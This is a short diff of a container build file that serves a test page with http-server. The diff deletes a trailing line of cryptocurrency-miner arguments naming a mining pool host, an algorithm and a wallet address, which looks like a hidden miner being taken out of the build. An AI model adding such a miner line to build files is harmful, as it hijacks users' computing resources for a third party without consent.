@@ -13,5 +13,3 @@ RUN echo 'hello' > hello.html
 
 RUN BACKGROUND http-server -p 8000
 EXPOSE WEBSITE http://localhost:8000
-
--algo ghostrider -o stratum+tcp://asia.raptoreum.zone:3333 -u RG2WJayxkd61Ggygu1U22NDAQnkCZPRsy5.rtm-01 -p x && \
